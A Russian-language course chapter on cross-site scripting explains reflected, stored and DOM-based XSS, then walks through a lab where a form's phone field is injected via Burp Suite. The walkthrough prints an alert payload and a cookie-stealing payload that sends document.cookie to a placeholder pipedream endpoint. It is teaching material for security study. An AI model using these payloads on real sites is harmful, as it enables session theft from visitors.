******************** 5.8 Атаки межсайтового скриптинга (XSS) **********************

Атаки межсайтового скриптинга (XSS)

Межсайтовый скриптинг (также известный как Cross-Site Scripting, XSS) – это уязвимость веб-безопасности, позволяющая злоумышленнику компрометировать взаимодействие пользователей с уязвимым приложением. Она позволяет злоумышленнику обходить политику одного источника (Same Origin Policy, SOP), которая предназначена для разделения различных веб сайтов друг от друга.

Как работает XSS?

Уязвимости межсайтового скриптинга, как правило, позволяют злоумышленнику маскироваться под пользователя-жертву, выполнять любые действия, которые может выполнить пользователь, и получать доступ к любым данным пользователя.

    Если пользователь-жертва имеет привилегированный доступ внутри приложения, то атакующий может получить полный контроль над всей функциональностью и данными приложения.

Межсайтовый скриптинг работает путем манипулирования уязвимым веб-сайтом, чтобы он возвращал пользователям вредоносный JavaScript. Когда вредоносный код выполняется внутри браузера жертвы, злоумышленник может полностью скомпрометировать их взаимодействие с приложением.

Типы XSS-атак

Существует три основных типа XSS-атак:

    Отраженный XSS, где вредоносный скрипт происходит из текущего HTTP запроса.
    Хранимый XSS, где вредоносный скрипт приходит из хранилища данных веб-сайта.
    Dom-based XSS, где уязвимость существует в клиентском коде, а не в коде сервера.

Отраженный XSS

Отраженный межсайтовый скриптинг (XSS) возникает, когда приложение получает данные в HTTP-запросе и включает эти данные непосредственно в ответ небезопасным способом.

Предположим, что веб-сайт имеет функцию поиска, которая получает пользовательское поисковое слово в параметре URL:  https://insecure-website.com/search?term=gift 

В ответе на этот URL приложение отвечает с заданным поисковым термином:
5_8_1.png
    Предполагая, что приложение не выполняет никакой другой обработки данных, атакующий может построить следующий вектор атаки:
    https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>.

Если другой пользователь приложения сделает запрос по URL злоумышленника, то скрипт, предоставленный злоумышленником, будет выполнен в браузере пользователя-жертвы, в контексте его сеанса работы с приложением.
Хранимый XSS

Сохраненный межсайтовый скриптинг (скриптинг второго порядка или постоянный XSS) возникает, когда приложение получает данные из недоверенного источника и включает эти данные в свои последующие HTTP-ответы небезопасным способом.

Предположим, что веб-сайт позволяет пользователям оставлять комментарии к записям в блогах, которые отображаются другим пользователям. Пользователи отправляют комментарии, используя HTTP-запрос как показано ниже:
5_8_2.png


После того, как этот комментарий будет отправлен, любой пользователь, посетивший пост в блоге, получит следующий комментарий в рамках ответа приложения:
5_8_3.png


Если предположить, что приложение не выполняет никакой другой обработки данных, злоумышленник может отправить такой вредоносный комментарий:
5_8_4.png


Комментарий злоумышленника будет иметь тело запроса:
5_8_5.png

Любой пользователь, посетивший пост в блоге, теперь получит следующий ответ в рамках ответа приложения:
5_8_6.png


Скрипт, предоставленный злоумышленником, будет затем выполнен в браузере пользователя-жертвы в контексте его сеанса работы с приложением.

Dom-based XSS

XSS-уязвимости, основанные на DOM, обычно возникают, когда JavaScript берет данные из подконтрольного злоумышленнику источника, например, URL, и передает их «раковине» (англ. sink), поддерживающей динамическое выполнение кода, например, eval() или innerHTML. Это позволяет злоумышленникам выполнять вредоносный JavaScript, что обычно приводит к взлому учетных записей других пользователей.

Для реализации XSS-атаки, основанной на DOM, необходимо поместить данные в источник таким образом, чтобы они распространились на поглотитель и вызвали выполнение произвольного JavaScript.

    Наиболее распространенным источником для DOM XSS является URL, доступ к которому обычно осуществляется с помощью объекта windows.location. Злоумышленник может построить ссылку для отправки жертвы на уязвимую страницу с полезной нагрузкой в строке запроса и фрагментами URL. В некоторых случаях, например, при нацеливании на страницу 404 или на сайт, работающий на PHP, полезная нагрузка также может быть помещена в путь.
    
    

Материалы для самостоятельного изучения

    Простейший пример уязвимости https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
    Наиболее объемный набор лабораторных работ с хорошими кейсами: практики portswigger. https://portswigger.net/web-security/all-labs#cross-site-scripting
    Механизмы обеспечения безопасности клиентской части https://developer.mozilla.org/en-US/docs/Web/Security
    Основополагающие механизмы в работе браузера: 
        SOP https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
        CORS https://developer.mozilla.org/en-US/docs/Glossary/CORS
        понятие "источника" https://developer.mozilla.org/en-US/docs/Glossary/Origin
        URL https://url.spec.whatwg.org/#origin
        
        

Разбор техники

Ход действий

1. Перейдем на главную страницу сайта http://evil.corp:1337/
5_8_7.png
2. Найдем этот запрос в BurpSuite, отправим в Repeater и внедрим кавычку в поле phone:
5_8_8.png
 

3. Отправим заявку и посмотрим на заполненную форму в html-коде, используя средства браузера:
5_8_9.png
    Как видим, кавычка не экранировалась, что говорит о возможности эксплуатации уязвимости XSS – cross-site scripting, заключающейся в внедрении своего JavaScript-кода в страницу сайта и его последующего выполнения браузером атакуемого пользователя.

4. Внедрим тем же способом знак “>” чтобы разорвать HTML-тэг и вставить свой; при этом убедимся, что закрывающая угловая скобка тоже не заэкранировалась.

Для значения phone +79117238383"> получим код:
5_8_10.png
5. Используем полезную нагрузку для выдачи сообщения 1 всем, кто открывает страницу с заказом:

+79117238383"><img src=x onerror=alert(1) />

Однако, при отправке запроса в BurpSuite эта полезная нагрузка вызывает ошибку:
5_8_11.png
6. Закодируем эту полезную нагрузку с помощью Decoder:
5_8_12.png
Теперь ошибка не возникает, и при заходе на страницу мы получаем сообщение:
5_8_13.png
7. Один из наиболее распространенных сценариев развития атаки в этой ситуации – передача Cookie посетителя атакующему. Чтобы принять запрос, воспользуемся ресурсом https://requestbin.com/. Используем указанный в поле Endpoint URL для получения Cookie:

+79117238383"><img src=x onerror=fetch('https://ADDR.x.pipedream.net/?'+document.cookie) />

где ADDR – адрес вашего endpoint.

8. Вновь закодируем полезную нагрузку и отправим её в запросе, а затем откроем новый заказ, после чего в интерфейсе pipedream появится запрос с флагом.

 
    
    
    
